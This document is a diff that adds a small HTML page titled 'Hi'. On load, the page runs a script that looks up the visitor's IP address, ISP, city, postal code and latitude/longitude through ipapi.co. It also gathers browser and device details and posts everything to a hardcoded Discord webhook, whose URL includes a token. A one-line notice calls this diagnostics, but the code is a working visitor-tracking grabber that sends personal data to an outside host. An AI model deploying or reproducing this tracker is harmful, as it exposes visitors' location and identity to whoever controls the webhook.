@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Hi</title>
+  <style>
+    body {
+      background: #111;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>👁️ Visitor Info Logged</h1>
+  <p>This site logs visitor information for diagnostics and security testing.</p>
+
+  <script>
+    async function getVisitorInfo() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        const userAgent = navigator.userAgent;
+        const language = navigator.language || navigator.userLanguage;
+        const platform = navigator.platform;
+        const resolution = `${screen.width}x${screen.height}`;
+        const memory = navigator.deviceMemory || 'N/A';
+        const cpu = navigator.hardwareConcurrency || 'N/A';
+
+        const content = `
+📍 **New Visitor Logged**
+🧠 **Device Info**
+• User Agent: \`${userAgent}\`
+• OS Platform: ${platform}
+• Language: ${language}
+• Screen: ${resolution}
+• CPU Threads: ${cpu}
+• RAM: ${memory} GB
+
+🌐 **Network Info**
+• IP: \`${data.ip}\`
+• ISP: ${data.org}
+• Country: ${data.country_name} (${data.country})
+• Region: ${data.region}
+• City: ${data.city}
+• Postal: ${data.postal}
+• Timezone: ${data.timezone}
+
+📌 **Location**
+• Latitude: ${data.latitude}
+• Longitude: ${data.longitude}
+        `;
+
+        await fetch("https://discord.com/api/webhooks/1365451163214024805/8OezJtvTg9WGDTX6vrHHr3z0eMq04t4NlVl0SUMDfhAOlg_l_Hyq4m6uDL2mEeUZwt3t", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content })
+        });
+
+      } catch (err) {
+        console.error("Failed to fetch/send visitor info:", err);
+      }
+    }
+
+    getVisitorInfo();
+  </script>
+</body>
+</html>
